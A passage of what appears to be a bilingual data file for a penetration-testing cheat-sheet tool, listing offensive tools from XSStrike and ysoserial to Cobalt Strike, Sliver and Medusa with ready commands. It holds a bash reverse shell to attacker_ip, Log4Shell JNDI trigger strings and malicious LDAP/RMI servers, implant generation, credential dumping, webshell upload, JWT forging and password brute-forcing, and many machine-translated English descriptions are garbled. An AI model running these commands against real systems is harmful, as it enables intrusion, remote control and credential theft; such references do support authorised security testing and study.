        command: 'dalfox url "https://target.com/q=test" --blind https://your-xss-hunter.com',
        description: { zh: '使用Blind XSS回调检测', en: 'UseBlind XSSCallbackDetection' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/hahwul/dalfox']
  },
  {
    id: 'xsstrike',
    name: 'XSStrike',
    description: { zh: '高级XSS检测工具，支持反射/存储/DOM型XSS检测', en: 'AdvancedXSSDetectionTools, supportsReflection/storage/DOM-Based XSSDetection' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/s0md3v/XSStrike && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '基础扫描', en: 'Basic Scan' },
        command: 'python3 xsstrike.py -u "https://target.com/search?q=test"',
        description: { zh: '扫描反射型XSS', en: 'ScanReflected XSS' },
        platform: 'all'
      },
      {
        name: { zh: 'POST方式', en: 'POST Method' },
        command: 'python3 xsstrike.py -u "https://target.com/comment" --data "content=test" --method POST',
        description: { zh: '测试POST参数的XSS', en: 'TestPOSTParameter XSS' },
        platform: 'all'
      },
      {
        name: { zh: '模糊测试', en: 'Fuzz Testing' },
        command: 'python3 xsstrike.py -u "https://target.com/q=test" --fuzzer',
        description: { zh: '使用模糊测试模式发现过滤规则', en: 'UseFuzz TestingModeDiscoverFilterRule' },
        platform: 'all'
      },
      {
        name: { zh: '爬虫模式', en: 'Crawler Mode' },
        command: 'python3 xsstrike.py -u "https://target.com" --crawl -l 3',
        description: { zh: '爬取3层深度的所有页面并测试XSS', en: 'Crawl all pages 3 levels deep and test for XSS' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/s0md3v/XSStrike']
  },
  {
    id: 'gopherus',
    name: 'Gopherus',
    description: { zh: '生成Gopher协议Payload，用于SSRF攻击内部服务', en: 'GenerateGopherProtocolPayload, used for SSRFAttackInternalService' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/tarunkant/Gopherus && pip install -r requirements.txt',
    commands: [
      {
        name: 'MySQL Payload',
        command: 'python2 gopherus.py --exploit mysql\n# 输入SQL查询语句后生成gopher://payload',
        description: { zh: '生成攻击MySQL的Gopher Payload', en: 'GenerateAttackMySQL Gopher Payload' },
        syntaxBreakdown: [
          { part: '--exploit mysql', explanation: { zh: '指定目标服务类型', en: 'specifiedTargetServiceType' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: 'Redis Payload',
        command: 'python2 gopherus.py --exploit redis\n# 可生成写入webshell/计划任务/SSH密钥等payload',
        description: { zh: '生成攻击Redis的Gopher Payload', en: 'GenerateAttackRedis Gopher Payload' },
        platform: 'all'
      },
      {
        name: 'FastCGI Payload',
        command: 'python2 gopherus.py --exploit fastcgi\n# 输入要执行的命令',
        description: { zh: '生成攻击PHP-FPM/FastCGI的Payload', en: 'GenerateAttackPHP-FPM/FastCGI Payload' },
        platform: 'all'
      },
      {
        name: 'SMTP Payload',
        command: 'python2 gopherus.py --exploit smtp',
        description: { zh: '生成通过SMTP发送邮件的Payload', en: 'Generate a payload that sends email via SMTP' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/tarunkant/Gopherus']
  },
  {
    id: 'smuggler',
    name: 'Smuggler',
    description: { zh: 'HTTP请求走私漏洞检测工具', en: 'HTTPRequest SmugglingVulnerabilityDetectionTools' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/defparam/smuggler && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '自动检测', en: 'Auto Detection' },
        command: 'python3 smuggler.py -u https://target.com',
        description: { zh: '自动检测HTTP请求走私漏洞', en: 'Auto DetectionHTTPRequest SmugglingVulnerability' },
        syntaxBreakdown: [
          { part: 'smuggler.py', explanation: { zh: 'HTTP走私检测脚本', en: 'HTTPSmugglingDetectionScript' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '指定技术', en: 'Specify Technique' },
        command: 'python3 smuggler.py -u https://target.com -t CL.TE',
        description: { zh: '测试CL.TE类型的请求走私', en: 'TestCL.TEType Request Smuggling' },
        platform: 'all'
      },
      {
        name: { zh: '批量测试', en: 'Batch Testing' },
        command: 'cat urls.txt | python3 smuggler.py',
        description: { zh: '从标准输入读取URL批量测试', en: 'Read URLs from stdin for batch testing' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/defparam/smuggler']
  },
  {
    id: 'jwt-tool',
    name: 'JWT Tool',
    description: { zh: 'JSON Web Token安全测试工具，支持伪造/破解/注入', en: 'JSON Web TokenSecurityTestTools, supportsForge/Crack/Injection' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'pip3 install jwt_tool / git clone https://github.com/ticarpi/jwt_tool',
    commands: [
      {
        name: { zh: '解析Token', en: 'Parse Token' },
        command: 'jwt_tool eyJhbGciOi...',
        description: { zh: '解析并显示JWT的Header和Payload', en: 'Parse and DisplayJWT Header and Payload' },
        syntaxBreakdown: [
          { part: 'jwt_tool', explanation: { zh: 'JWT安全测试工具', en: 'JWT SecurityTestTools' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '全自动攻击', en: 'Full Auto Attack' },
        command: 'jwt_tool -t https://target.com/api -rh "Authorization: Bearer eyJ..." -M at',
        description: { zh: '自动尝试所有已知JWT攻击', en: 'AutomaticAttemptallKnownJWTAttack' },
        platform: 'all'
      },
      {
        name: { zh: 'None算法攻击', en: 'None Algorithm Attack' },
        command: 'jwt_tool eyJhbGciOi... -X a',
        description: { zh: '尝试将算法改为none绕过验证', en: 'Attempt to change the algorithm to none to bypass verification' },
        platform: 'all'
      },
      {
        name: { zh: '密钥暴力破解', en: 'Key Brute Force' },
        command: 'jwt_tool eyJhbGciOi... -C -d /usr/share/wordlists/rockyou.txt',
        description: { zh: '暴力破解HMAC密钥', en: 'Brute ForceHMACkey' },
        platform: 'all'
      },
      {
        name: { zh: '伪造Token', en: 'Forge Token' },
        command: 'jwt_tool eyJhbGciOi... -S hs256 -p "secret_key" -I -pc role -pv admin',
        description: { zh: '使用已知密钥伪造Token，修改角色为admin', en: 'UseKnownkeyForge Token, ModifyRole is admin' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/ticarpi/jwt_tool']
  },
  {
    id: 'graphqlmap',
    name: 'GraphQLmap',
    description: { zh: 'GraphQL API渗透测试工具，支持自省查询和注入', en: 'GraphQL API penetration testing tool with introspection query and injection support' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt',
    commands: [
      {
        name: { zh: '自省查询', en: 'Introspection Query' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x dump_schema',
        description: { zh: '通过自省查询导出完整Schema', en: 'throughIntrospection QueryExportcompleteSchema' },
        platform: 'all'
      },
      {
        name: { zh: '字段枚举', en: 'Field Enumeration' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x enum',
        description: { zh: '枚举所有可用的Query/Mutation字段', en: 'Enumerate all available Query/Mutation fields' },
        platform: 'all'
      },
      {
        name: { zh: 'SQL注入', en: 'SQLInjection' },
        command: 'python3 graphqlmap.py -u https://target.com/graphql --method POST -x nosqli',
        description: { zh: '测试GraphQL参数的注入漏洞', en: 'TestGraphQLParameter InjectionVulnerability' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/swisskyrepo/GraphQLmap']
  },
  {
    id: 'cadaver',
    name: 'Cadaver',
    description: { zh: 'WebDAV客户端工具，用于测试WebDAV服务', en: 'WebDAVClientTools, used for TestWebDAVService' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'apt install cadaver',
    commands: [
      {
        name: { zh: '连接WebDAV', en: 'Connect WebDAV' },
        command: 'cadaver https://target.com/webdav/',
        description: { zh: '连接到WebDAV服务器', en: 'Connection to WebDAVServer' },
        platform: 'linux'
      },
      {
        name: { zh: '上传文件', en: 'Upload File' },
        command: '# 在cadaver交互式Shell中:\nput shell.aspx\nmput *.txt',
        description: { zh: '上传Webshell或文件到WebDAV目录', en: 'UploadWebshell or File to WebDAVDirectory' },
        platform: 'linux'
      },
      {
        name: { zh: '列出和下载', en: 'List and Download' },
        command: '# cadaver Shell:\nls\nget config.xml\nmget *.bak',
        description: { zh: '列出目录内容并下载文件', en: 'List DirectoryContent and Download File' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/notroj/cadaver']
  },
  {
    id: 'searchsploit',
    name: 'Searchsploit',
    description: { zh: 'Exploit-DB本地搜索工具，离线查找漏洞利用代码', en: 'Exploit-DB local search tool for offline exploit code lookup' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: 'apt install exploitdb / searchsploit -u (更新数据库)', en: 'apt install exploitdb / searchsploit -u (Update Database)' },
    commands: [
      {
        name: { zh: '搜索漏洞', en: 'Search Exploits' },
        command: 'searchsploit apache 2.4\nsearchsploit wordpress 5.0',
        description: { zh: '按关键词搜索漏洞利用', en: 'Search exploits by keyword' },
        syntaxBreakdown: [
          { part: 'searchsploit', explanation: { zh: 'Exploit-DB本地搜索工具', en: 'Exploit-DBLocalSearchTools' }, type: 'command' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '精确搜索', en: 'Exact Search' },
        command: 'searchsploit -e "Apache Tomcat"\nsearchsploit --exclude="dos" windows smb',
        description: { zh: '精确匹配和排除关键词', en: 'Exact match and exclude keywords' },
        platform: 'all'
      },
      {
        name: { zh: '复制利用代码', en: 'Copy Exploit Code' },
        command: 'searchsploit -m 44228\nsearchsploit -p 44228',
        description: { zh: '复制exploit到当前目录或显示路径', en: 'Copyexploit to currentDirectory or DisplayPath' },
        platform: 'all'
      },
      {
        name: { zh: 'JSON输出', en: 'JSON Output' },
        command: 'searchsploit -j apache | jq ".RESULTS_EXPLOIT[]"',
        description: { zh: 'JSON格式输出便于脚本处理', en: 'JSON format output for script processing' },
        platform: 'all'
      }
    ],
    references: ['https://www.exploit-db.com/searchsploit']
  },
  {
    id: 'exploitdb',
    name: 'ExploitDB',
    description: { zh: '漏洞利用代码数据库在线搜索', en: 'ExploitationCodeDatabaseOnline Search' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '在线使用: https://www.exploit-db.com / 本地: searchsploit', en: 'Online: https://www.exploit-db.com / Local: searchsploit' },
    commands: [
      {
        name: { zh: '在线搜索', en: 'Online Search' },
        command: '# 访问 https://www.exploit-db.com\n# 搜索框输入: Apache Struts\n# 或使用Google Dork:\nsite:exploit-db.com "Apache Struts" RCE',
        description: { zh: '在线搜索漏洞利用代码', en: 'Online SearchExploitationCode' },
        platform: 'all'
      },
      {
        name: { zh: 'API查询', en: 'API Query' },
        command: 'curl "https://www.exploit-db.com/search?q=wordpress+5.0" -H "X-Requested-With: XMLHttpRequest"',
        description: { zh: '通过API搜索(需要合适的请求头)', en: 'Search via API (requires appropriate request headers)' },
        platform: 'all'
      },
      {
        name: 'Google Hacking',
        command: '# ExploitDB收录的Google Dorks:\nhttps://www.exploit-db.com/google-hacking-database\n# 搜索泄露的配置文件、数据库等',
        description: { zh: '使用ExploitDB的Google Hacking数据库', en: 'UseExploitDB Google HackingDatabase' },
        platform: 'all'
      }
    ],
    references: ['https://www.exploit-db.com']
  },
  {
    id: 'ysoserial',
    name: 'ysoserial',
    description: { zh: 'Java反序列化漏洞利用Payload生成工具', en: 'Java DeserializationExploitationPayloadGenerateTools' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: 'java -jar ysoserial.jar / 下载: https://github.com/frohoff/ysoserial/releases', en: 'java -jar ysoserial.jar / Download: https://github.com/frohoff/ysoserial/releases' },
    commands: [
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'java -jar ysoserial.jar CommonsCollections1 "id" | base64\njava -jar ysoserial.jar CommonsCollections5 "whoami" > payload.bin',
        description: { zh: '使用指定Gadget Chain生成反序列化Payload', en: 'UsespecifiedGadget ChainGenerateDeserializationPayload' },
        syntaxBreakdown: [
          { part: 'CommonsCollections1', explanation: { zh: 'Gadget Chain名称(依赖目标classpath)', en: 'Gadget chain name (depends on target classpath)' }, type: 'parameter' },
          { part: '"id"', explanation: { zh: '要执行的系统命令', en: 'NeedExecute System Commands' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '列出Gadget', en: 'List Gadgets' },
        command: 'java -jar ysoserial.jar --help\n# 常用: CommonsCollections1-7, Jdk7u21, URLDNS, JRMPClient',
        description: { zh: '列出所有可用的Gadget Chain', en: 'List all available gadget chains' },
        platform: 'all'
      },
      {
        name: { zh: 'JRMP攻击', en: 'JRMP Attack' },
        command: '# 监听端(攻击机):\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,base64_cmd}|{base64,-d}|{bash,-i}"\n\n# 发送JRMP客户端Payload:\njava -jar ysoserial.jar JRMPClient attacker_ip:1099 > jrmp.bin',
        description: { zh: '通过JRMP协议进行远程利用', en: 'throughJRMPProtocol perform RemoteExploitation' },
        platform: 'all'
      },
      {
        name: { zh: 'URLDNS探测', en: 'URLDNS Probing' },
        command: 'java -jar ysoserial.jar URLDNS "http://your_dnslog.com/test" | base64',
        description: { zh: '使用URLDNS链探测反序列化漏洞(无需依赖)', en: 'Use URLDNS chain to detect deserialization vulnerabilities (no dependencies required)' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/frohoff/ysoserial']
  },
  {
    id: 'ysoserial-net',
    name: 'ysoserial.net',
    description: { zh: '.NET反序列化Payload生成工具', en: '.NETDeserializationPayloadGenerateTools' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '下载: https://github.com/pwntester/ysoserial.net/releases', en: 'Download: https://github.com/pwntester/ysoserial.net/releases' },
    commands: [
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: 'ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc" -o base64',
        description: { zh: '生成.NET反序列化Payload', en: 'Generate.NETDeserializationPayload' },
        syntaxBreakdown: [
          { part: '-g', explanation: { zh: 'Gadget Chain名称', en: 'Gadget chain name' }, type: 'parameter' },
          { part: '-f', explanation: { zh: '序列化格式(BinaryFormatter/ObjectStateFormatter等)', en: 'Sequencecolumn-izeFormat(BinaryFormatter/ObjectStateFormatter etc.)' }, type: 'parameter' },
          { part: '-c', explanation: { zh: '要执行的命令', en: 'NeedExecute Command' }, type: 'parameter' },
          { part: '-o base64', explanation: { zh: 'Base64编码输出', en: 'Base64 EncodingOutput' }, type: 'parameter' },
        ],
        platform: 'windows'
      },
      {
        name: { zh: 'ViewState攻击', en: 'ViewState Attack' },
        command: 'ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg=SHA1 --validationkey=MACHINE_KEY --generator=GENERATOR',
        description: { zh: '伪造ASP.NET ViewState执行命令', en: 'ForgeASP.NET ViewStateExecute Command' },
        platform: 'windows'
      },
      {
        name: { zh: '列出可用链', en: 'List Available Chains' },
        command: 'ysoserial.exe -l\n# 常用: TextFormattingRunProperties, TypeConfuseDelegate, PSObject',
        description: { zh: '列出所有可用的Gadget Chain和格式', en: 'List all available gadget chains and formats' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/pwntester/ysoserial.net']
  },
  {
    id: 'marshalsec',
    name: 'Marshalsec',
    description: { zh: 'Java反序列化利用工具，支持多种Marshal格式和JNDI注入', en: 'Java DeserializationExploitationTools, supportsMultipleMarshalFormat and JNDIInjection' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/mbechler/marshalsec && mvn clean package -DskipTests',
    commands: [
      {
        name: { zh: 'LDAP服务器', en: 'LDAP Server' },
        command: 'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker_ip:8888/#Exploit" 1389',
        description: { zh: '启动恶意LDAP服务器用于JNDI注入(Log4Shell等)', en: 'StartMaliciousLDAP Server used for JNDIInjection(Log4Shell etc.)' },
        syntaxBreakdown: [
          { part: 'LDAPRefServer', explanation: { zh: '启动LDAP Reference服务器', en: 'StartLDAP ReferenceServer' }, type: 'command' },
          { part: '"http://attacker_ip:8888/#Exploit"', explanation: { zh: '恶意class文件托管URL', en: 'Malicious class file hosting URL' }, type: 'value' },
          { part: '1389', explanation: { zh: 'LDAP服务监听端口', en: 'LDAPServicelisteningPort' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'RMI服务器', en: 'RMI Server' },
        command: 'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker_ip:8888/#Exploit" 1099',
        description: { zh: '启动恶意RMI服务器', en: 'StartMaliciousRMI Server' },
        platform: 'all'
      },
      {
        name: { zh: '配合Log4Shell', en: 'Combined with Log4Shell' },
        command: '# 1. 编译恶意class: javac Exploit.java\n# 2. 托管class: python3 -m http.server 8888\n# 3. 启动LDAP: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ip:8888/#Exploit" 1389\n# 4. 触发: ${jndi:ldap://ip:1389/Exploit}',
        description: { zh: '配合Log4j2 RCE完整利用链', en: 'Complete Log4j2 RCE exploitation chain' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/mbechler/marshalsec']
  },
  {
    id: 'jndi-exploit',
    name: 'JNDIExploit',
    description: { zh: 'JNDI注入利用工具，集成多种Gadget和Bypass', en: 'JNDI injection exploitation tool with multiple gadgets and bypasses' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/feihong-cs/JNDIExploit && mvn clean package',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'java -jar JNDIExploit.jar -i attacker_ip',
        description: { zh: '启动JNDI Exploit服务(同时监听LDAP 1389和HTTP 3456)', en: 'StartJNDI ExploitService(MeanwhilelisteningLDAP 1389 and HTTP 3456)' },
        syntaxBreakdown: [
          { part: '-i', explanation: { zh: '攻击机IP地址', en: 'Attacker machine IP address' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '命令执行', en: 'Command Execution' },
        command: '# 触发Payload:\n${jndi:ldap://attacker_ip:1389/Basic/Command/Base64/Y21k}\n${jndi:ldap://attacker_ip:1389/Basic/ReverseShell/attacker_ip/4444}',
        description: { zh: '通过不同路由执行命令或反弹Shell', en: 'through not SameRouteExecute Command or Reverse Shell' },
        platform: 'all'
      },
      {
        name: { zh: 'Bypass高版本JDK', en: 'Bypass High Version JDK' },
        command: '# 使用Tomcat Bypass:\n${jndi:ldap://attacker_ip:1389/TomcatBypass/Command/Base64/d2hvYW1p}\n# 使用反序列化Bypass:\n${jndi:ldap://attacker_ip:1389/Deserialization/CommonsCollections5/Command/Base64/d2hvYW1p}',
        description: { zh: '绕过高版本JDK的trustURLCodebase限制', en: 'BypassHighVersionJDK trustURLCodebaseRestrict' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/feihong-cs/JNDIExploit']
  },
  {
    id: 'rogue-jndi',
    name: 'Rogue JNDI',
    description: { zh: '恶意JNDI服务器，提供多种攻击向量', en: 'Malicious JNDI server providing multiple attack vectors' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/veracode-research/rogue-jndi && mvn package',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'java -jar RogueJndi.jar --command "whoami" --hostname attacker_ip',
        description: { zh: '启动恶意JNDI服务(LDAP+RMI+HTTP)', en: 'StartMaliciousJNDIService(LDAP+RMI+HTTP)' },
        platform: 'all'
      },
      {
        name: { zh: '反弹Shell', en: 'Reverse Shell' },
        command: 'java -jar RogueJndi.jar --command "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" --hostname attacker_ip',
        description: { zh: '配置反弹Shell命令', en: 'ConfigurationReverse ShellCommand' },
        platform: 'all'
      },
      {
        name: { zh: '触发利用', en: 'Trigger Exploitation' },
        command: '# LDAP: ${jndi:ldap://attacker_ip:1389/o=reference}\n# RMI: ${jndi:rmi://attacker_ip:1099/o=reference}',
        description: { zh: '在目标注入JNDI Lookup触发利用', en: 'in TargetInjectionJNDI LookupTrigger Exploitation' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/veracode-research/rogue-jndi']
  },
  {
    id: 'cobalt-strike',
    name: 'Cobalt Strike',
    description: { zh: '商业化红队C2框架，支持多种攻击和后渗透功能', en: 'Commercial red team C2 framework supporting multiple attack and post-exploitation capabilities' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: { zh: '商业软件，需要购买License / 启动: ./teamserver ip password profile.crt', en: 'Commercial software, requires license purchase / Start: ./teamserver ip password profile.crt' },
    commands: [
      {
        name: { zh: '启动Team Server', en: 'Start Team Server' },
        command: './teamserver your_ip your_password malleable_c2_profile.profile',
        description: { zh: '启动CS服务端', en: 'StartCSServer-Side' },
        platform: 'linux'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: '# GUI操作:\n# Attacks > Packages > Windows Executable (S)\n# Attacks > Packages > HTML Application\n# Attacks > Web Drive-by > Scripted Web Delivery',
        description: { zh: '通过图形界面生成各类Payload', en: 'Generate various payloads via the GUI' },
        platform: 'all'
      },
      {
        name: { zh: '常用Beacon命令', en: 'Common Beacon Commands' },
        command: '# 基础信息\nwhoami\nshell ipconfig\ngetuid\n\n# 横向移动\njump psexec target_ip SMB_listener\njump winrm target_ip HTTP_listener\n\n# 凭证获取\nhashdump\nlogonpasswords\n\n# 持久化\npersist-service\npersist-registry',
        description: { zh: '获取Beacon后的常用后渗透命令', en: 'ObtainBeaconAfter CommonPost-Exploitation Commands' },
        platform: 'windows'
      },
      {
        name: 'Malleable C2',
        command: '# 使用C2 Profile伪装流量:\n# https://github.com/rsmudge/Malleable-C2-Profiles\n./teamserver ip pass jquery-c2.4.0.profile',
        description: { zh: '使用Malleable C2 Profile伪装通信流量', en: 'Disguise C2 traffic using Malleable C2 Profiles' },
        platform: 'linux'
      }
    ],
    references: ['https://www.cobaltstrike.com/']
  },
  {
    id: 'sliver',
    name: 'Sliver',
    description: { zh: '开源跨平台红队C2框架，Cobalt Strike替代品', en: 'Open-source cross-platform red team C2 framework, Cobalt Strike alternative' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'curl https://sliver.sh/install | sudo bash / go install github.com/BishopFox/sliver/client@latest',
    commands: [
      {
        name: { zh: '启动服务', en: 'Start Service' },
        command: 'sliver-server',
        description: { zh: '启动Sliver服务端', en: 'StartSliverServer-Side' },
        platform: 'linux'
      },
      {
        name: { zh: '生成Implant', en: 'Generate Implant' },
        command: '# 在Sliver控制台:\ngenerate --mtls attacker_ip --os windows --arch amd64 --save implant.exe\ngenerate --http attacker_ip --os linux --format shared --save implant.so',
        description: { zh: '生成各平台的植入体', en: 'Generate implants for each platform' },
        platform: 'all'
      },
      {
        name: { zh: '启动监听', en: 'Start Listener' },
        command: 'mtls -l 8888\nhttps -l 443 -d example.com\nwg -l 51820',
        description: { zh: '启动mTLS/HTTPS/WireGuard监听器', en: 'StartmTLS/HTTPS/WireGuardListener' },
        platform: 'all'
      },
      {
        name: { zh: '后渗透命令', en: 'Post-Exploitation Commands' },
        command: '# 获取Session后:\ninfo\ngetuid\nps\ndownload /etc/shadow\nupload local_file /tmp/remote\nexecute -o whoami\npivots tcp --bind 0.0.0.0:9050',
        description: { zh: '常用后渗透操作命令', en: 'Common post-exploitation commands' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/BishopFox/sliver']
  },
  {
    id: 'mythic',
    name: 'Mythic',
    description: { zh: '模块化C2框架，支持多种Agent和自定义扩展', en: 'Module-izeC2Framework, supportsMultipleAgent and CustomExtension' },
    category: { zh: '漏洞利用', en: 'Exploitation' },
    installation: 'git clone https://github.com/its-a-feature/Mythic && cd Mythic && ./install_docker_ubuntu.sh && sudo ./mythic-cli start',
    commands: [
      {
        name: { zh: '安装Agent', en: 'Install Agent' },
        command: 'sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo\nsudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon',
        description: { zh: '安装Apollo(Windows)或Poseidon(Linux) Agent', en: 'InstallationApollo(Windows) or Poseidon(Linux) Agent' },
        platform: 'linux'
      },
      {
        name: { zh: '访问Web界面', en: 'Access Web Interface' },
        command: 'https://attacker_ip:7443\n# 默认账号: mythic_admin\n# 密码查看: cat .env | grep MYTHIC_ADMIN_PASSWORD',
        description: { zh: '通过Web界面管理C2操作', en: 'Manage C2 operations via the web interface' },
        platform: 'all'
      },
      {
        name: { zh: '生成Payload', en: 'Generate Payload' },
        command: '# 在Web界面:\n# 1. 创建Payload Profile\n# 2. 选择Agent类型(Apollo/Poseidon等)\n# 3. 配置C2 Profile\n# 4. 生成Payload下载',
        description: { zh: '通过图形界面配置和生成Payload', en: 'Configure and generate payloads via the GUI' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/its-a-feature/Mythic']
  },
  {
    id: 'medusa',
    name: 'Medusa',
    description: { zh: '快速并行网络登录暴力破解工具', en: 'Fast parallel network login brute-force tool' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install medusa',
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'medusa -h target_ip -u admin -P passwords.txt -M ssh -t 4',
        description: { zh: '4线程SSH密码暴力破解', en: '4threadSSHPasswordBrute Force' },
        syntaxBreakdown: [
          { part: 'medusa', explanation: { zh: '并行网络登录破解工具', en: 'and lineNetworkLoginCrackTools' }, type: 'command' },
          { part: '-h', explanation: { zh: '目标主机', en: 'TargetHost' }, type: 'parameter' },
          { part: '-u', explanation: { zh: '用户名', en: 'Username' }, type: 'parameter' },
          { part: '-P', explanation: { zh: '密码字典文件', en: 'PasswordDictionaryFile' }, type: 'parameter' },
          { part: '-M ssh', explanation: { zh: '指定协议模块', en: 'specifiedProtocolModule' }, type: 'parameter' },
          { part: '-t 4', explanation: { zh: '并发线程数', en: 'concurrentthread count' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M rdp -t 2',
        description: { zh: 'RDP远程桌面密码破解', en: 'RDP remote desktop password cracking' },
        platform: 'all'
      },
      {
        name: { zh: 'FTP爆破', en: 'FTP Brute Force' },
        command: 'medusa -h target_ip -U users.txt -P passwords.txt -M ftp -f',
        description: { zh: 'FTP破解(找到密码后停止)', en: 'FTPCrack(Find to PasswordAfterStop)' },
        platform: 'all'
      },
      {
        name: { zh: '批量爆破', en: 'Batch Brute Force' },
        command: 'medusa -H hosts.txt -U users.txt -P pass.txt -M ssh -t 3 -T 5',
        description: { zh: '批量主机爆破(5台并行)', en: 'Batch host brute force (5 hosts in parallel)' },
        platform: 'all'
      }
    ],
    references: ['https://github.com/jmk-foofus/medusa']
  },
  {
    id: 'ncrack',
    name: 'Ncrack',
    description: { zh: 'Nmap项目出品的高速网络认证破解工具', en: 'High-speed network authentication cracking tool by the Nmap project' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: { zh: 'apt install ncrack / 源码编译', en: 'apt install ncrack / SourceCodeCompile' },
    commands: [
      {
        name: { zh: 'SSH爆破', en: 'SSH Brute Force' },
        command: 'ncrack -vv -U users.txt -P passwords.txt ssh://target_ip',
        description: { zh: 'SSH认证暴力破解', en: 'SSHAuthenticationBrute Force' },
        syntaxBreakdown: [
          { part: 'ncrack', explanation: { zh: '高速网络认证破解工具', en: 'High-speed network authentication cracking tool' }, type: 'command' },
          { part: '-vv', explanation: { zh: '详细输出', en: 'Verbose Output' }, type: 'parameter' },
          { part: 'ssh://target_ip', explanation: { zh: '协议://目标格式', en: 'Protocol://TargetFormat' }, type: 'value' },
        ],
        platform: 'all'
      },
      {
        name: { zh: '多服务爆破', en: 'Multi-Service Brute Force' },
        command: 'ncrack -U users.txt -P pass.txt ssh://10.0.0.1 rdp://10.0.0.2 ftp://10.0.0.3',
        description: { zh: '同时破解多个目标的不同服务', en: 'MeanwhileCrackMultipleTarget not SameService' },
        platform: 'all'
      },
      {
        name: { zh: '联动Nmap', en: 'Combined with Nmap' },
        command: 'ncrack -iX nmap_scan.xml -U users.txt -P pass.txt',
        description: { zh: '直接导入Nmap扫描结果进行破解', en: 'DirectlyImportNmapScanResult perform Crack' },
        platform: 'all'
      }
    ],
    references: ['https://nmap.org/ncrack/']
  },
  {
    id: 'crowbar',
    name: 'Crowbar',
    description: { zh: '专注RDP/VNC/SSH密钥/OpenVPN的暴力破解工具', en: 'Brute-force tool focused on RDP/VNC/SSH keys/OpenVPN' },
    category: { zh: '密码攻击', en: 'Password Attacks' },
    installation: 'apt install crowbar / pip3 install crowbar',
    commands: [
      {
        name: { zh: 'RDP爆破', en: 'RDP Brute Force' },
        command: 'crowbar -b rdp -s target_ip/32 -u admin -C passwords.txt -n 2',
        description: { zh: 'RDP密码暴力破解(2线程)', en: 'RDPPasswordBrute Force(2thread)' },
        syntaxBreakdown: [
          { part: '-b rdp', explanation: { zh: '指定协议类型', en: 'specifiedProtocolType' }, type: 'parameter' },
          { part: '-s', explanation: { zh: '目标IP/CIDR', en: 'TargetIP/CIDR' }, type: 'parameter' },
          { part: '-n 2', explanation: { zh: '并发连接数', en: 'concurrentConnectionNumber' }, type: 'parameter' },
        ],
        platform: 'all'
      },
      {
        name: { zh: 'SSH密钥爆破', en: 'SSH Key Brute Force' },
        command: 'crowbar -b sshkey -s target_ip/32 -u root -k /path/to/keys/',
        description: { zh: '尝试多个SSH私钥登录', en: 'AttemptMultipleSSHprivate keyLogin' },
        platform: 'all'
      },
      {
